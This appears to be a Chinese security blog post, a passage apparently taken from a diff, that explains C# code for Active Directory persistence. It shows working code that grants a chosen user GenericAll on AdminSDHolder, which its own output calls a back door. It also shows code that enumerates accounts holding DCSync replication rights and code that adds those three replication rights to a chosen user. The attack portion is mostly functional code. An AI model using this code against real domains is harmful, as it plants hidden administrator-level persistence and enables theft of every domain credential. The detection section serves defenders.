+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">foreach (DirectoryEntry computer in Ldapcoon.coon.Children)</span><br><span class="line">&#123;</span><br><span class="line">    if (computer.Name == &quot;CN=AdminSDHolder&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        ActiveDirectorySecurity sdc = computer.ObjectSecurity;</span><br><span class="line">        NTAccount Account = new NTAccount(username);</span><br><span class="line">        SecurityIdentifier Sid =(SecurityIdentifier)Account.Translate(typeof(SecurityIdentifier));</span><br><span class="line">        ActiveDirectoryAccessRule rule = new ActiveDirectoryAccessRule(Sid,ActiveDirectoryRights.GenericAll,AccessControlType.Allow);</span><br><span class="line">        sdc.SetAccessRule(rule);</span><br><span class="line">        computer.CommitChanges();</span><br><span class="line">        Font.InfoFonts();</span><br><span class="line">        Console.WriteLine(&quot;AdminSDHolder back door add user &quot;+ username + &quot; success!!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们先遍历节点当节点为CN=AdminSDHolder的时候获取他的安全规则集合<br>​</p>
+<p>然后我们看到ActiveDirectoryAccessRule类：用于表示 Active Directory 域服务对象的自由访问控制列表 (DACL) 中的访问控制项 (ACE)。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ActiveDirectoryAccessRule(IdentityReference, ActiveDirectoryRights, AccessControlType)</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到第一个参数为一个IdentityReference对象，第二个参数为访问规则权限的一个或多个，第三个参数为访问规则类型。<br>​</p>
+<p>我们前面的account为NTAccount类型，我们可以通过Translate把他转换为IdentityReference类型，然后第二个我们设置为GenericAll，第三个设置为允许。我们设置了这个规则后可以通过SetAccessRule方法来设置。<br>​</p>
+<p>最后通过CommitChanges方法来进行添加。<br>​</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img11@main/2021/10/01/1633088532594-ada9c117-a54f-4d77-b713-43b2fad42b83.png"></p>
+<h1 id="0x05-Dcsync检测与后门用户添加"><a href="#0x05-Dcsync检测与后门用户添加" class="headerlink" title="0x05 Dcsync检测与后门用户添加"></a>0x05 Dcsync检测与后门用户添加</h1><h2 id="5-1-检测"><a href="#5-1-检测" class="headerlink" title="5.1 检测"></a>5.1 检测</h2><p>当用户对根域拥有完全控制权限或者拥有以下三条ace或者对以下权限打勾的时候就能dcsync。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</span><br><span class="line">1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</span><br><span class="line">89e95b76-444d-4c62-991a-0facbeda640c</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img15@main/2021/10/01/1633088546852-d4974e77-7b91-4246-a76c-63766d749206.png"></p>
+<p>我们先绑定rootpath为根路径然后先判断拥有完全控制权限的用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (rule.ActiveDirectoryRights.ToString().Equals(&quot;GenericAll&quot;))</span><br><span class="line">&#123;</span><br><span class="line">    string acl = rule.IdentityReference.Value;</span><br><span class="line">    if (acl.Contains(&quot;-&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">        //域外查询可能会出现用户名为sid的情况。所以需要转换</span><br><span class="line">        //Console.WriteLine(acl);</span><br><span class="line">        string user_name = public_value.SidToUserName(acl);</span><br><span class="line">        if (user_name != &quot;error&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            ACE_Changes.Add(user_name);</span><br><span class="line">            ACE_Changes_All.Add(user_name);</span><br><span class="line">            ACE_Changes_In_Filtered_Set.Add(user_name);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        ACE_Changes.Add(acl);</span><br><span class="line">        ACE_Changes_All.Add(acl);</span><br><span class="line">        ACE_Changes_In_Filtered_Set.Add(acl);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ACE_Changes.Add(acl);</span><br><span class="line">ACE_Changes_All.Add(acl);</span><br><span class="line">ACE_Changes_In_Filtered_Set.Add(acl);</span><br></pre></td></tr></table></figure>
+
+<p>这里我通过switch case来进行判断是否拥有这个三条acl，可能有些用户只有两条或者一条，所以我通过<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">string guids = rule.ObjectType.ToString();</span><br><span class="line">switch (guids)</span><br><span class="line">&#123;</span><br><span class="line">  case &quot;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2&quot;:</span><br><span class="line">    username = dcsync_return_username(rule);</span><br><span class="line">    if(username == null)</span><br><span class="line">    &#123;</span><br><span class="line">    	continue;</span><br><span class="line">    &#125;</span><br><span class="line">    //Console.WriteLine(&quot;ACE:复制目录更改&quot;);</span><br><span class="line">    //Console.WriteLine(&quot;User:&quot;+ username);</span><br><span class="line">    ACE_Changes.Add(username);</span><br><span class="line">    break;</span><br><span class="line">  case &quot;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2&quot;:</span><br><span class="line">    username = dcsync_return_username(rule);</span><br><span class="line">    if (username == null)</span><br><span class="line">    &#123;</span><br><span class="line">    	continue;</span><br><span class="line">    &#125;</span><br><span class="line">    //Console.WriteLine(&quot;ACE:复制目录更改全部&quot;);</span><br><span class="line">    //Console.WriteLine(&quot;User:&quot; + username);</span><br><span class="line">    ACE_Changes_All.Add(username);</span><br><span class="line">    break;</span><br><span class="line">  case &quot;89e95b76-444d-4c62-991a-0facbeda640c&quot;:</span><br><span class="line">    username = dcsync_return_username(rule);</span><br><span class="line">    if (username == null)</span><br><span class="line">    &#123;</span><br><span class="line">    	continue;</span><br><span class="line">    &#125;</span><br><span class="line">    //Console.WriteLine(&quot;ACE:复制过滤集中的目录更改&quot;);</span><br><span class="line">    //Console.WriteLine(&quot;User:&quot; + username);</span><br><span class="line">    ACE_Changes_In_Filtered_Set.Add(username);</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>来进行处理，当拥有每条acl的时候就添加到一个集合里面，然后我们再取三个集合的交集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//取三个集合的交集</span><br><span class="line">IEnumerable&lt;string&gt; dcsync_users1 = ACE_Changes.Intersect(ACE_Changes_All);</span><br><span class="line">IEnumerable&lt;string&gt; dcsync_users2 = dcsync_users1.Intersect(ACE_Changes_In_Filtered_Set);</span><br><span class="line">foreach(string dcsync_users in dcsync_users2)</span><br><span class="line">&#123;</span><br><span class="line">	Console.WriteLine(dcsync_users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过以上方法取出来我发现了一个问题当一个用户勾选了特殊权限，他的acl里面那三个复制目录权限是没有打上勾的但是依然能够进行dcsync。<br>​</p>
+<p>再ActiveDirectoryAccessRule类里面存在一个InheritedObjectType属性，他的作用是获取可继承ObjectAccessRule对象的子对象的类型，所以我们也要判断用户这里面的值是否也用户这三条acl。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">string guids_extend = rule.InheritedObjectType.ToString();</span><br><span class="line">switch (guids_extend)</span><br><span class="line">&#123;</span><br><span class="line">  case &quot;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2&quot;:</span><br><span class="line">  username = dcsync_return_username(rule);</span><br><span class="line">  if (username == null)</span><br><span class="line">  &#123;</span><br><span class="line">  	continue;</span><br><span class="line">  &#125;</span><br><span class="line">  //Console.WriteLine(&quot;ACE:复制目录更改&quot;);</span><br><span class="line">  //Console.WriteLine(&quot;User:&quot;+ username);</span><br><span class="line">  ACE_Changes.Add(username);</span><br><span class="line">  break;</span><br><span class="line">	case &quot;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2&quot;:</span><br><span class="line">    username = dcsync_return_username(rule);</span><br><span class="line">    if (username == null)</span><br><span class="line">    &#123;</span><br><span class="line">    	continue;</span><br><span class="line">    &#125;</span><br><span class="line">    //Console.WriteLine(&quot;ACE:复制目录更改全部&quot;);</span><br><span class="line">    //Console.WriteLine(&quot;User:&quot; + username);</span><br><span class="line">    ACE_Changes_All.Add(username);</span><br><span class="line">    break;</span><br><span class="line">  case &quot;89e95b76-444d-4c62-991a-0facbeda640c&quot;:</span><br><span class="line">  username = dcsync_return_username(rule);</span><br><span class="line">  if (username == null)</span><br><span class="line">  &#123;</span><br><span class="line">  	continue;</span><br><span class="line">  &#125;</span><br><span class="line">  //Console.WriteLine(&quot;ACE:复制过滤集中的目录更改&quot;);</span><br><span class="line">  //Console.WriteLine(&quot;User:&quot; + username);</span><br><span class="line">  ACE_Changes_In_Filtered_Set.Add(username);</span><br><span class="line">  break;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="5-2-添加"><a href="#5-2-添加" class="headerlink" title="5.2 添加"></a>5.2 添加</h2><p>我们通过ExtendedRightAccessRule类来添加这三条acl的guid</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public ExtendedRightAccessRule (System.Security.Principal.IdentityReference identity, System.Security.AccessControl.AccessControlType type, Guid extendedRightType);</span><br></pre></td></tr></table></figure>
+
+<p>第一个为SecurityIdentifier的对象，前面已经说明了。第二个为访问规则类型。第三个为acl的guid。<br>​</p>
+<p>然后通过AddAccessRule来添加。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ActiveDirectorySecurity adsOUSec = Ldapcoon.coon.ObjectSecurity;</span><br><span class="line">NTAccount ntaToDelegate = new NTAccount(username);</span><br><span class="line">SecurityIdentifier Sid = (SecurityIdentifier)ntaToDelegate.Translate(typeof(SecurityIdentifier));</span><br><span class="line">Guid Get_Changes = new Guid(&quot;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2&quot;);</span><br><span class="line">Guid Get_Changes_All = new Guid(&quot;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2&quot;);</span><br><span class="line">Guid ACE_Changes_In_Filtered = new Guid(&quot;89e95b76-444d-4c62-991a-0facbeda640c&quot;);</span><br><span class="line">ExtendedRightAccessRule Changes = new ExtendedRightAccessRule(ntaToDelegate, AccessControlType.Allow, Get_Changes);</span><br><span class="line">ExtendedRightAccessRule Changes_All = new ExtendedRightAccessRule(ntaToDelegate, AccessControlType.Allow, Get_Changes_All);</span><br><span class="line">ExtendedRightAccessRule Changes_Filtered = new ExtendedRightAccessRule(ntaToDelegate, AccessControlType.Allow, ACE_Changes_In_Filtered);</span><br><span class="line">adsOUSec.AddAccessRule(Changes);</span><br><span class="line">adsOUSec.AddAccessRule(Changes_All);</span><br><span class="line">adsOUSec.AddAccessRule(Changes_Filtered);</span><br><span class="line">Ldapcoon.coon.CommitChanges()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img15@main/2021/10/01/1633088565777-50f3824e-76ce-434b-b497-6763af4e7baf.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img14@main/2021/10/01/1633088582319-4254af82-8604-4d89-9d9b-77ffc1ecc06d.png"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://avatars.githubusercontent.com/u/47177122?v=4"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yicunyiye" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1</span>
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
